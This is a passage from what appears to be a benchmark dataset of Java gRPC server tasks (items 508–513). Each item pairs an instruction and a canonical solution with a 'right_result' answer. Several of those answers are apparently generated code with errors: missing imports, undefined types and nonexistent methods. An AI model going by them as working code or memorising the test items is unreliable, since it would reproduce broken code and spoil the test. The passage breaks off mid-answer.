  public void sayHelloStreaming(HelloRequest req, StreamObserver<HelloReply> responseObserver) {\n      try {\n        logger.info(\"Saying hi\");\n        responseObserver.onNext(\n            HelloReply.newBuilder().setMessage(\"Hello \" + req.getName()).build());\n        Thread.sleep(100);\n        logger.info(\"Saying hi\");\n        responseObserver.onNext(\n            HelloReply.newBuilder().setMessage(\"Hello \" + req.getName() + \"!\").build());\n        Thread.sleep(100);\n        logger.info(\"Saying hi\");\n        responseObserver.onNext(\n            HelloReply.newBuilder().setMessage(\"Hello \" + req.getName() + \"!!\").build());\n      } catch (InterruptedException e) {\n        responseObserver.onError(e);\n      } finally {\n        responseObserver.onCompleted();\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "right_result": "```java\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.stub.StreamObserver;\nimport java.io.IOException;\nimport java.util.concurrent.TimeUnit;\nimport java.util.logging.Logger;\n\npublic class HelloWorldServer {\n    private Server server;\n    private static final Logger logger = Logger.getLogger(HelloWorldServer.class.getName());\n\n    private void start() throws IOException {\n        int port = 50051;\n        server = ServerBuilder.forPort(port)\n                .addService(new GreeterImpl())\n                .build()\n                .start();\n        logger.info(\"Server started, listening on \" + port);\n\n        Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n            // Use stderr here since the logger may have been reset by its JVM shutdown hook.\n            System.err.println(\"*** shutting down gRPC server since JVM is shutting down\");\n            try {\n                HelloWorldServer.this.stop();\n            } catch (InterruptedException e) {\n                e.printStackTrace(System.err);\n            }\n            System.err.println(\"*** server shut down\");\n        }));\n    }\n\n    private void stop() throws InterruptedException {\n        if (server != null) {\n            server.shutdown().awaitTermination(30, TimeUnit.SECONDS);\n        }\n    }\n\n    private void blockUntilShutdown() throws InterruptedException {\n        if (server != null) {\n            server.awaitTermination();\n        }\n    }\n\n    public static void main(String[] args) throws IOException, InterruptedException {\n        final HelloWorldServer server = new HelloWorldServer();\n        server.start();\n        server.blockUntilShutdown();\n    }\n\n    static class GreeterImpl extends StreamingGreeterGrpc.StreamingGreeterImplBase {\n        @Override\n        public void sayHelloStreaming(HelloRequest req, StreamObserver<HelloReply> responseObserver) {\n            String clientName = req.getName();\n            for (int i = 1; i <= 3; i++) {\n                String message = \"Hello \" + clientName + \"! Welcome \" + i + \" time.\";\n                responseObserver.onNext(HelloReply.newBuilder().setMessage(message).build());\n                try {\n                    Thread.sleep(i * 1000); // Simulate work\n                } catch (InterruptedException e) {\n                    responseObserver.onError(e);\n                    return;\n                }\n            }\n            responseObserver.onCompleted();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 508,
    "Instruction": "Task Description: Implement a gRPC server in Java that listens for incoming requests and provides book-related services. The server should start on a specified port, handle graceful shutdown, and wait for termination.\n\nClass Description: The BookServer class represents a gRPC server implementation that hosts book-related services. It manages server lifecycle including startup, shutdown, and termination waiting.\n\nAttributes:\n- server: [io.grpc.Server] - The gRPC server instance that handles incoming requests\n- logger: [java.util.logging.Logger] - Logger instance for server status messages\n\nMethods:\n- start() -> [void] - Starts the gRPC server on the default port (50051) and registers the BookService. Also adds a shutdown hook for graceful termination.\n- stop() -> [void] - Initiates a graceful shutdown of the gRPC server if it's running.\n- blockUntilShutdown() -> [void] - Blocks the main thread until the server is terminated.\n- main(String[] args) -> [void] - Entry point that creates and starts the server, then waits for shutdown. Throws IOException and InterruptedException.\n\nThe class follows gRPC server best practices including:\n1. Using ServerBuilder to create and configure the server\n2. Adding services before starting\n3. Implementing graceful shutdown\n4. Proper error handling\n5. Logging server status",
    "Canonical_solution": "import io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport java.io.IOException;\nimport java.util.logging.Logger;\n\npublic class BookServer {\n  private static final Logger logger = Logger.getLogger(BookServer.class.getName());\n\n  private Server server;\n\n  private void start() throws IOException {\n    int port = 50051;\n    server = ServerBuilder.forPort(port).addService(new BookService()).build().start();\n    logger.info(\"Server started, listening on \" + port);\n    Runtime.getRuntime()\n        .addShutdownHook(\n            new Thread(\n                () -> {\n                  System.err.println(\"*** shutting down gRPC server since JVM is shutting down\");\n                  BookServer.this.stop();\n                  System.err.println(\"*** server shut down\");\n                }));\n  }\n\n  private void stop() {\n    if (server != null) {\n      server.shutdown();\n    }\n  }\n\n  private void blockUntilShutdown() throws InterruptedException {\n    if (server != null) {\n      server.awaitTermination();\n    }\n  }\n\n  public static void main(String[] args) throws IOException, InterruptedException {\n    final BookServer server = new BookServer();\n    server.start();\n    server.blockUntilShutdown();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "right_result": "```java\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport java.io.IOException;\nimport java.util.concurrent.TimeUnit;\nimport java.util.logging.Logger;\n\npublic class BookServer {\n    private static final Logger logger = Logger.getLogger(BookServer.class.getName());\n    private Server server;\n\n    public void start() throws IOException {\n        int port = 50051;\n        server = ServerBuilder.forPort(port)\n                .addService(new BookServiceImpl())\n                .build()\n                .start();\n        logger.info(\"Server started, listening on \" + port);\n        Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n            // Use stderr here since the logger may have been reset by its JVM shutdown hook.\n            System.err.println(\"*** shutting down gRPC server since JVM is shutting down\");\n            try {\n                BookServer.this.stop();\n            } catch (InterruptedException e) {\n                e.printStackTrace(System.err);\n            }\n            System.err.println(\"*** server shut down\");\n        }));\n    }\n\n    public void stop() throws InterruptedException {\n        if (server != null) {\n            server.shutdown().awaitTermination(30, TimeUnit.SECONDS);\n        }\n    }\n\n    /**\n     * Await termination on the main thread since the grpc library uses daemon threads.\n     */\n    private void blockUntilShutdown() throws InterruptedException {\n        if (server != null) {\n            server.awaitTermination();\n        }\n    }\n\n    public static void main(String[] args) throws IOException, InterruptedException {\n        final BookServer server = new BookServer();\n        server.start();\n        server.blockUntilShutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 509,
    "Instruction": "Task Description: Create a gRPC server in Java that handles incoming requests with configurable delays and traces request contexts using Brave propagation. The server should intercept calls to collect headers and propagation data, and allow for graceful shutdown.\n\nClass Description: TestServer is a gRPC server implementation that intercepts incoming calls to collect tracing information and headers. It supports configurable response delays and maintains queues for request processing.\n\nAttributes:\n- delayQueue: BlockingQueue<Long> - Queue for storing artificial delay durations (milliseconds) to be applied to requests\n- headers: BlockingQueue<Metadata> - Queue for storing metadata headers from incoming requests\n- requests: BlockingQueue<TraceContextOrSamplingFlags> - Queue for storing extracted trace contexts from requests\n- extractor: Extractor<GrpcServerRequest> - Brave propagation extractor for trace context extraction\n- server: Server - The gRPC server instance\n\nMethods:\n- TestServer(Map<String, Key<String>> nameToKey, Propagation<String> propagation) -> void - Constructor that initializes the server with propagation configuration\n- start() -> void - Starts the gRPC server\n- stop() -> void - Stops the server gracefully and awaits termination\n- port() -> int - Returns the port number the server is listening on\n- takeRequest() -> TraceContextOrSamplingFlags - Retrieves the next request context from the queue (waits up to 3 seconds)\n- enqueueDelay(long millis) -> void - Adds a delay duration to be applied to the next request",
    "Canonical_solution": "import brave.propagation.Propagation;\nimport brave.propagation.TraceContext.Extractor;\nimport brave.propagation.TraceContextOrSamplingFlags;\nimport io.grpc.Metadata;\nimport io.grpc.Metadata.Key;\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.ServerCall;\nimport io.grpc.ServerCall.Listener;\nimport io.grpc.ServerCallHandler;\nimport io.grpc.ServerInterceptor;\nimport io.grpc.ServerInterceptors;\nimport java.io.IOException;\nimport java.util.Map;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.LinkedBlockingQueue;\nimport java.util.concurrent.TimeUnit;\n\nclass TestServer {\n  static final Key<String> CUSTOM_KEY = Key.of(\"custom\", Metadata.ASCII_STRING_MARSHALLER);\n  final BlockingQueue<Long> delayQueue = new LinkedBlockingQueue<>();\n  final BlockingQueue<Metadata> headers = new LinkedBlockingQueue<>();\n  final BlockingQueue<TraceContextOrSamplingFlags> requests = new LinkedBlockingQueue<>();\n  final Extractor<GrpcServerRequest> extractor;\n  final Server server;\n\n  TestServer(Map<String, Key<String>> nameToKey, Propagation<String> propagation) {\n    extractor = propagation.extractor(GrpcServerRequest::propagationField);\n    server = ServerBuilder.forPort(PickUnusedPort.get())\n        .addService(ServerInterceptors.intercept(\n            new GreeterImpl(null),\n            new ServerInterceptor() {\n              @Override\n              public <ReqT, RespT> Listener<ReqT> interceptCall(ServerCall<ReqT, RespT> call,\n                  Metadata headers, ServerCallHandler<ReqT, RespT> next) {\n                Long delay = delayQueue.poll();\n                if (delay != null) {\n                  try {\n                    Thread.sleep(delay);\n                  } catch (InterruptedException e) {\n                    Thread.currentThread().interrupt();\n                    throw new AssertionError(\"interrupted sleeping \" + delay);\n                  }\n                }\n                TestServer.this.headers.add(headers);\n                requests.add(extractor.extract(new GrpcServerRequest(nameToKey, call, headers)));\n                return next.startCall(new SimpleForwardingServerCall<ReqT, RespT>(call) {\n                  @Override public void sendHeaders(Metadata headers) {\n                    headers.put(CUSTOM_KEY, \"brave\");\n                    super.sendHeaders(headers);\n                  }\n                }, headers);\n              }\n            }))\n        .build();\n  }\n\n  void start() throws IOException {\n    server.start();\n  }\n\n  void stop() {\n    server.shutdown();\n    try {\n      server.awaitTermination();\n    } catch (InterruptedException e) {\n      Thread.currentThread().interrupt();\n      throw new AssertionError(e);\n    }\n  }\n\n  int port() {\n    return server.getPort();\n  }\n\n  TraceContextOrSamplingFlags takeRequest() {\n    try {\n      return requests.poll(3, TimeUnit.SECONDS);\n    } catch (InterruptedException e) {\n      Thread.currentThread().interrupt();\n      throw new AssertionError(e);\n    }\n  }\n\n  void enqueueDelay(long millis) {\n    this.delayQueue.add(millis);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "right_result": "```java\nimport brave.propagation.Extractor;\nimport brave.propagation.Propagation;\nimport brave.propagation.TraceContextOrSamplingFlags;\nimport io.grpc.Metadata;\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.stub.StreamObserver;\n\nimport java.util.Map;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.LinkedBlockingQueue;\n\npublic class TestServer {\n    private final BlockingQueue<Long> delayQueue = new LinkedBlockingQueue<>();\n    private final BlockingQueue<Metadata> headers = new LinkedBlockingQueue<>();\n    private final BlockingQueue<TraceContextOrSamplingFlags> requests = new LinkedBlockingQueue<>();\n    private final Extractor<GrpcServerRequest> extractor = Propagation.B3_STRING.extractor();\n    private Server server;\n\n    public TestServer(Map<String, Key<String>> nameToKey, Propagation<String> propagation) {\n        // Initialize server with propagation configuration\n    }\n\n    public void start() throws Exception {\n        server = ServerBuilder.forPort(0)\n                .addService(new TestServiceImpl())\n                .build()\n                .start();\n    }\n\n    public void stop() {\n        if (server != null) {\n            server.shutdown().awaitTermination(300, TimeUnit.SECONDS);\n        }\n    }\n\n    public int port() {\n        return server.getPort();\n    }\n\n    public TraceContextOrSamplingFlags takeRequest() throws InterruptedException {\n        return requests.poll(3, TimeUnit.SECONDS);\n    }\n\n    public void enqueueDelay(long millis) {\n        delayQueue.add(millis);\n    }\n\n    private static class TestServiceImpl extends YourServiceGrpc.YourServiceImplBase {\n        @Override\n        public void yourMethod(YourRequest request, StreamObserver<YourResponse> responseObserver) {\n            try {\n                long delay = delayQueue.take();\n                Thread.sleep(delay);\n\n                Metadata headers = new Metadata();\n                // Collect headers from request\n\n                TraceContextOrSamplingFlags flags = extractor.extract(request);\n                requests.put(flags);\n\n                YourResponse response = YourResponse.newBuilder().build();\n                responseObserver.onNext(response);\n                responseObserver.onCompleted();\n            } catch (Exception e) {\n                responseObserver.onError(e);\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 510,
    "Instruction": "Task Description: Create a Java class that implements a gRPC server using NettyServerBuilder to handle multiple language processing services.\n\nClass Description: The ZemberekGrpcServer class is responsible for initializing and managing a gRPC server that provides various Turkish language processing services. It uses Netty as the underlying transport layer and allows configuration of the server port and service implementations.\n\nAttributes:\n- port: [int] - The port number on which the gRPC server will listen for incoming connections.\n- context: [ZemberekContext] - The context object containing configuration and resources for language processing services.\n- DEFAULT_PORT: [static final int] - The default port number (6789) used when no specific port is provided.\n\nMethods:\n- Constructor: [ZemberekGrpcServer](int port, ZemberekGrpcConfiguration configuration) -> [void] - Initializes the server with the specified port and configuration.\n- getPort: [getPort]() -> [int] - Returns the port number the server is configured to use.\n- getContext: [getContext]() -> [ZemberekContext] - Returns the ZemberekContext object containing service configurations.\n- start: [start]() -> [void] - Starts the gRPC server, adds all service implementations, and begins listening for requests. This method blocks until the server terminates.\n- main: [main](String[] args) -> [void] - The entry point that creates and starts the server using default parameters.",
    "Canonical_solution": "import io.grpc.Server;\nimport io.grpc.netty.shaded.io.grpc.netty.NettyServerBuilder;\nimport zemberek.core.logging.Log;\n\npublic class ZemberekGrpcServer {\n\n    public static final int DEFAULT_PORT = 6789;\n\n    private final int port;\n    private ZemberekContext context;\n\n    public ZemberekGrpcServer(int port, ZemberekGrpcConfiguration configuration) {\n        this.port = port;\n        context = new ZemberekContext(configuration);\n    }\n\n    public int getPort() {\n        return port;\n    }\n\n    public ZemberekContext getContext() {\n        return context;\n    }\n\n    public void start() throws Exception {\n        Server server = NettyServerBuilder.forPort(port)\n                .addService(new LanguageIdServiceImpl())\n                .addService(new PreprocessingServiceImpl())\n                .addService(new NormalizationServiceImpl(context))\n                .addService(new MorphologyServiceImpl(context))\n                .build()\n                .start();\n        Log.info(\"Zemberek grpc server started at port: \" + port);\n        server.awaitTermination();\n    }\n\n    public static void main(String[] args) throws Exception {\n        new ZemberekGrpcServer(DEFAULT_PORT, null).start();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "right_result": "```java\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.stub.StreamObserver;\n\npublic class ZemberekGrpcServer {\n    private static final int DEFAULT_PORT = 6789;\n    private final int port;\n    private final ZemberekContext context;\n    private Server server;\n\n    public ZemberekGrpcServer(int port, ZemberekGrpcConfiguration configuration) {\n        this.port = port;\n        this.context = new ZemberekContext(configuration);\n    }\n\n    public int getPort() {\n        return port;\n    }\n\n    public ZemberekContext getContext() {\n        return context;\n    }\n\n    public void start() throws IOException, InterruptedException {\n        server = ServerBuilder.forPort(port)\n                .addService(new LanguageProcessingServiceImpl(context))\n                .build()\n                .start();\n        System.out.println(\"Server started, listening on \" + port);\n        Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n            System.err.println(\"*** shutting down gRPC server since JVM is shutting down\");\n            ZemberekGrpcServer.this.stop();\n            System.err.println(\"*** server shut down\");\n        }));\n        server.awaitTermination();\n    }\n\n    private void stop() {\n        if (server != null) {\n            server.shutdown();\n        }\n    }\n\n    public static void main(String[] args) throws IOException, InterruptedException {\n        int port = args.length > 0 ? Integer.parseInt(args[0]) : DEFAULT_PORT;\n        ZemberekGrpcConfiguration config = new ZemberekGrpcConfiguration();\n        new ZemberekGrpcServer(port, config).start();\n    }\n}\n```"
  },
  {
    "Task_id": 511,
    "Instruction": "Task Description: Create a Java class that implements a gRPC server launcher for Spring Boot applications, capable of registering multiple gRPC services and managing server lifecycle.\n\nClass Description: The GrpcLauncher class is responsible for starting and managing a gRPC server in a Spring Boot application. It automatically discovers gRPC service beans, configures server parameters, and handles graceful shutdown. The class uses Lombok for logging and Spring's dependency injection.\n\nAttributes:\n- server: [Server] - The gRPC server instance\n- grpcServerPort: [Integer] - The port number for the gRPC server, injected from application properties\n- DEFAULT_MAX_MESSAGE_SIZE: [int] - Constant defining the maximum message size (10MB)\n\nMethods:\n- grpcStart: [grpcStart](Map<String, Object> grpcServiceBeanMap) -> void - Initializes and starts the gRPC server, registering all provided gRPC service beans. Handles server lifecycle and shutdown hooks.\n- grpcStop: [grpcStop]() -> void - Shuts down the gRPC server gracefully when called, typically during application termination.",
    "Canonical_solution": "import io.grpc.BindableService;\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport java.io.IOException;\nimport java.util.Map;\n\n@Slf4j\n@Component(\"grpcLauncher\")\npublic class GrpcLauncher {\n\n    public static final int DEFAULT_MAX_MESSAGE_SIZE = 10 * 1024 * 1024;\n\n    private Server server;\n\n    @Value(\"${server.grpc.port}\")\n    private Integer grpcServerPort;\n\n    public void grpcStart(Map<String, Object> grpcServiceBeanMap) {\n        try {\n            ServerBuilder serverBuilder = ServerBuilder.forPort(grpcServerPort);\n            for (Object bean : grpcServiceBeanMap.values()){\n                serverBuilder.addService((BindableService) bean);\n                log.info(\"{} is register in Spring Boot\", bean.getClass().getSimpleName());\n            }\n            server = serverBuilder\n                .maxInboundMessageSize(DEFAULT_MAX_MESSAGE_SIZE)\n                .maxInboundMetadataSize(DEFAULT_MAX_MESSAGE_SIZE)\n                .build().start();\n            log.info(\"grpc server is started at {}\", grpcServerPort);\n            server.awaitTermination();\n            Runtime.getRuntime().addShutdownHook(new Thread(this::grpcStop));\n        } catch (IOException | InterruptedException e){\n            e.printStackTrace();\n        }\n    }\n\n    private void grpcStop(){\n        if (server != null){\n            server.shutdownNow();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "right_result": "```java\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PostConstruct;\nimport javax.annotation.PreDestroy;\nimport java.io.IOException;\nimport java.util.Map;\n\n@Component\n@Slf4j\npublic class GrpcLauncher {\n\n    private Server server;\n    @Value(\"${grpc.server.port}\")\n    private Integer grpcServerPort;\n    private static final int DEFAULT_MAX_MESSAGE_SIZE = 10 * 1024 * 1024; // 10MB\n\n    @PostConstruct\n    public void start() {\n        try {\n            server = ServerBuilder.forPort(grpcServerPort)\n                    .maxInboundMessageSize(DEFAULT_MAX_MESSAGE_SIZE)\n                    .addServices(new GrpcServiceRegistry().registerServices())\n                    .build()\n                    .start();\n            log.info(\"gRPC server started on port {}\", grpcServerPort);\n        } catch (IOException e) {\n            log.error(\"Failed to start gRPC server\", e);\n        }\n    }\n\n    @PreDestroy\n    public void stop() {\n        if (server != null) {\n            server.shutdownGracefully(5000, 60000);\n            log.info(\"gRPC server shutting down\");\n        }\n    }\n\n    private static class GrpcServiceRegistry {\n        public io.grpc.ServiceDescriptor[] registerServices() {\n            // Implement service registration logic here\n            return new io.grpc.ServiceDescriptor[0];\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 512,
    "Instruction": "Task Description: Create a Java class that implements a gRPC server for a simple \"Hello World\" service, following the gRPC framework conventions. The server should handle incoming requests, process them, and send back appropriate responses, while also managing server lifecycle operations.\n\nClass Description: The HelloWorldServer class is a gRPC server implementation that listens on a specified port, handles incoming gRPC requests for a greeting service, and manages server startup and shutdown operations. It includes an inner class that implements the actual gRPC service logic.\n\nAttributes:\n- server: [io.grpc.Server] - The gRPC server instance that handles incoming requests\n- logger: [java.util.logging.Logger] - Logger instance for server status messages\n\nMethods:\n- start() -> [void] - Starts the gRPC server on a predefined port (50051) and registers the Greeter service implementation. Also adds a shutdown hook for graceful termination.\n- stop() -> [void] - Stops the gRPC server if it's running\n- blockUntilShutdown() -> [void] - Blocks the main thread until the server is terminated\n- main(String[] args) -> [void] - Entry point that creates and starts the server instance\n- GreeterImpl.sayHello(HelloRequest req, StreamObserver<HelloReply> responseObserver) -> [void] - Implementation of the gRPC service method that processes HelloRequest and sends HelloReply",
    "Canonical_solution": "import io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.examples.helloworld.GreeterGrpc;\nimport io.grpc.examples.helloworld.HelloReply;\nimport io.grpc.examples.helloworld.HelloRequest;\nimport io.grpc.stub.StreamObserver;\nimport java.io.IOException;\nimport java.util.logging.Logger;\n\npublic class HelloWorldServer {\n  private static final Logger logger = Logger.getLogger(HelloWorldServer.class.getName());\n\n  private Server server;\n\n  private void start() throws IOException {\n    int port = 50051;\n    server = ServerBuilder.forPort(port).addService(new GreeterImpl()).build().start();\n    logger.info(\"Server started, listening on \" + port);\n    Runtime.getRuntime()\n        .addShutdownHook(\n            new Thread() {\n              @Override\n              public void run() {\n                System.err.println(\"*** shutting down gRPC server since JVM is shutting down\");\n                HelloWorldServer.this.stop();\n                System.err.println(\"*** server shut down\");\n              }\n            });\n  }\n\n  private void stop() {\n    if (server != null) {\n      server.shutdown();\n    }\n  }\n\n  private void blockUntilShutdown() throws InterruptedException {\n    if (server != null) {\n      server.awaitTermination();\n    }\n  }\n\n  public static void main(String[] args) throws IOException, InterruptedException {\n    final HelloWorldServer server = new HelloWorldServer();\n    server.start();\n    server.blockUntilShutdown();\n  }\n\n  static class GreeterImpl extends GreeterGrpc.GreeterImplBase {\n    @Override\n    public void sayHello(HelloRequest req, StreamObserver<HelloReply> responseObserver) {\n      HelloReply reply = HelloReply.newBuilder().setMessage(\"Hello \" + req.getName()).build();\n      responseObserver.onNext(reply);\n      responseObserver.onCompleted();\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "right_result": "```java\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.stub.StreamObserver;\n\nimport java.io.IOException;\nimport java.util.concurrent.TimeUnit;\nimport java.util.logging.Logger;\n\npublic class HelloWorldServer {\n    private static final int PORT = 50051;\n    private Server server;\n    private static final Logger logger = Logger.getLogger(HelloWorldServer.class.getName());\n\n    private void start() throws IOException {\n        server = ServerBuilder.forPort(PORT)\n                .addService(new GreeterImpl())\n                .build()\n                .start();\n        logger.info(\"Server started, listening on \" + PORT);\n        Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n            // Use stderr here since the logger may have been reset by its JVM shutdown hook.\n            System.err.println(\"*** shutting down gRPC server since JVM is shutting down\");\n            try {\n                HelloWorldServer.this.stop();\n            } catch (InterruptedException e) {\n                e.printStackTrace(System.err);\n            }\n            System.err.println(\"*** server shut down\");\n        }));\n    }\n\n    private void stop() throws InterruptedException {\n        if (server != null) {\n            server.shutdown().awaitTermination(30, TimeUnit.SECONDS);\n        }\n    }\n\n    public void blockUntilShutdown() throws InterruptedException {\n        if (server != null) {\n            server.awaitTermination();\n        }\n    }\n\n    public static void main(String[] args) throws IOException, InterruptedException {\n        final HelloWorldServer server = new HelloWorldServer();\n        server.start();\n        server.blockUntilShutdown();\n    }\n\n    static class GreeterImpl extends GreeterGrpc.GreeterImplBase {\n        @Override\n        public void sayHello(HelloRequest req, StreamObserver<HelloReply> responseObserver) {\n            HelloReply reply = HelloReply.newBuilder().setMessage(\"Hello \" + req.getName()).build();\n            responseObserver.onNext(reply);\n            responseObserver.onCompleted();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 513,
    "Instruction": "Task Description: Create a gRPC server in Java that handles data requests, including synchronous, streaming, and bidirectional streaming operations, with Prometheus monitoring integration.\n\nClass Description: DataHandler is a gRPC server implementation that processes various types of data requests. It includes metrics collection through Prometheus and provides three main service methods for data operations.\n\nAttributes:\n- LOG: [Logger] - Logger instance for server operations logging\n- PORT: [int] - Port number for the gRPC server (1111)\n- syncRequests: [Counter] - Prometheus counter for tracking synchronous requests\n- streamingRequests: [Counter] - Prometheus counter for tracking streaming requests\n- grpcServer: [Server] - gRPC server instance\n- prometheusHttpServer: [HTTPServer] - Prometheus HTTP server for metrics exposure\n\nMethods:\n- start() -> [void] - Initializes and starts the gRPC server with Prometheus monitoring interceptor\n- blockUntilShutdown() -> [void] - Blocks the main thread until server shutdown\n- stop() -> [void] - Gracefully shuts down the gRPC server\n\nNested Class: DataImpl extends DataServiceGrpc.DataServiceImplBase and implements three service methods:\n- get([DataRequest], [StreamObserver<DataResponse>]) -> [void] - Handles synchronous data requests (converts input to uppercase)\n- streamingGet([EmptyRequest], [StreamObserver<DataResponse>]) -> [void] - Streams 10 sequential responses\n- streamingPut([StreamObserver<DataRequest>]) -> [StreamObserver<DataResponse>] - Handles bidirectional streaming (modifies and collects input data)",
    "Canonical_solution": "import colossus.data.Data;\nimport colossus.data.DataServiceGrpc;\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.ServerInterceptors;\nimport io.grpc.stub.StreamObserver;\nimport io.prometheus.client.CollectorRegistry;\nimport io.prometheus.client.Counter;\nimport io.prometheus.client.exporter.HTTPServer;\nimport me.dinowernli.grpc.prometheus.Configuration;\nimport me.dinowernli.grpc.prometheus.MonitoringServerInterceptor;\n\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.logging.Logger;\nimport java.util.stream.IntStream;\n\npublic class DataHandler {\n    private static final Logger LOG = Logger.getLogger(DataHandler.class.getName());\n    private static final int PORT = 1111;\n    private static final Counter syncRequests = Counter.build()\n            .name(\"data_svc_sync_requests\")\n            .help(\"Sync requests to the data service\")\n            .labelNames(\"request_key\")\n            .register();\n\n    private static final Counter streamingRequests = Counter.build()\n            .name(\"data_svc_streaming_requests\")\n            .help(\"Streaming requests to the data service\")\n            .register();\n\n    private Server grpcServer;\n    private static HTTPServer prometheusHttpServer;\n\n    static class DataImpl extends DataServiceGrpc.DataServiceImplBase {\n        private static final Logger LOG = Logger.getLogger(DataImpl.class.getName());\n\n        @Override\n        public void get(Data.DataRequest req, StreamObserver<Data.DataResponse> resObserver) {\n            String request = req.getRequest();\n            LOG.info(String.format(\"Request received for the string: \\\"%s\\\"\", request));\n            String computedValue = request.toUpperCase();\n            LOG.info(String.format(\"Computed value: \\\"%s\\\"\", computedValue));\n            Data.DataResponse res = Data.DataResponse.newBuilder()\n                    .setValue(computedValue)\n                    .build();\n\n            syncRequests.labels(request).inc();\n\n            resObserver.onNext(res);\n            resObserver.onCompleted();\n        }\n\n        @Override\n        public void streamingGet(Data.EmptyRequest req, StreamObserver<Data.DataResponse> resObserver) {\n            LOG.info(\"Request received for streaming data\");\n\n            Data.DataResponse.Builder resBldr = Data.DataResponse.newBuilder();\n\n            IntStream.range(0, 10).forEach(i -> {\n                String value = String.format(\"Response %d\", i);\n\n                streamingRequests.inc();\n\n                resObserver.onNext(resBldr.setValue(value).build());\n            });\n\n            resObserver.onCompleted();\n        }\n\n        @Override\n        public StreamObserver<Data.DataRequest> streamingPut(final StreamObserver<Data.DataResponse> resObserver) {\n            return new StreamObserver<Data.DataRequest>() {\n                private List<String> items = new ArrayList<>();\n\n                @Override\n                public void onNext(Data.DataRequest req) {\n                    items.add(req.getRequest().replace(\"f\", \"9\").toUpperCase());\n                }\n\n                @Override\n                public void onError(Throwable t) {\n                    resObserver.onError(t);\n                }\n\n                @Override\n                public void onCompleted() {\n                    Data.DataResponse res = Data.DataResponse.newBuilder()\n                            .setValue(items.toString())\n                            .build();\n\n                    resObserver.onNext(res);\n                    resObserver.onCompleted();\n                }\n            };\n        }\n    }\n\n    private void start() throws IOException {\n        Configuration monitoringConfig = Configuration.cheapMetricsOnly();\n        MonitoringServerInterceptor prometheusInterceptor = MonitoringServerInterceptor.create(\n            monitoringConfig.withCollectorRegistry(new CollectorRegistry()));\n\n        grpcServer = ServerBuilder.forPort(PORT)\n            .addService(ServerInterceptors.intercept(new DataImpl().bindService(), prometheusInterceptor))\n            .build()\n            .start();\n        LOG.info(String.format(\"gRPC server successfully started on port %d\", PORT));\n    }\n\n    private void blockUntilShutdown() throws InterruptedException {\n        if (grpcServer != null) {\n            grpcServer.awaitTermination();\n        }\n    }\n\n    private void stop() {\n        if (grpcServer != null) grpcServer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "right_result": "```java\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.stub.StreamObserver;\nimport io.prometheus.client.Counter;\nimport io.prometheus.client.exporter.HTTPServer;\n\npublic class DataHandler {\n    private static final Logger LOG = Logger.getLogger(DataHandler.class.getName());\n    private static final int PORT = 1111;\n    private Counter syncRequests = Counter.build().name(\"sync_requests_total\").help(\"Total synchronous requests.\").register();\n    private Counter streamingRequests = Counter.build().name(\"streaming_requests_total\").help(\"Total streaming requests.\").register();\n    private Server grpcServer;\n    private HTTPServer prometheusHttpServer;\n\n    public void start() throws IOException {\n        prometheusHttpServer = new HTTPServer(8080);\n        grpcServer = ServerBuilder.forPort(PORT)\n                .addService(new DataImpl())\n                .intercept(new PrometheusMetricsInterceptor(syncRequests, streamingRequests))\n                .build()\n                .start();\n        LOG.info(\"gRPC server started on port \" + PORT);\n    }\n\n    public void blockUntilShutdown() throws InterruptedException {\n        if (grpcServer != null) {\n            grpcServer.awaitTermination();\n        }\n    }\n\n    public void stop() {\n        if (grpcServer != null) {\n            grpcServer.shutdown();\n        }\n        if (prometheusHttpServer != null) {\n            prometheusHttpServer.stop();\n        }\n    }\n\n    private static class DataImpl extends DataServiceGrpc.DataServiceImplBase {\n        @Override\n        public void get(DataRequest request, StreamObserver<DataResponse> responseObserver) {\n            syncRequests.inc();\n            String uppercased = request.getData().toUpperCase();\n            responseObserver.onNext(DataResponse.newBuilder().setData(uppercased).build());\n            responseObserver.onCompleted();\n        }\n\n        @Override\n        public void streamingGet(EmptyRequest request, StreamObserver<DataResponse> responseObserver) {\n            streamingRequests.inc();\n            for (int i = 0; i < 10; i++) {\n                responseObserver.onNext(DataResponse.newBuilder().setData(\"Response \" + i).build());\n            }\n            responseObserver.onCompleted();\n        }\n\n        @Override\n        public StreamObserver<DataRequest> streamingPut(StreamObserver<DataResponse> responseObserver) {\n            return new StreamObserver<DataRequest>() {\n                @Override\n                public void onNext(DataRequest 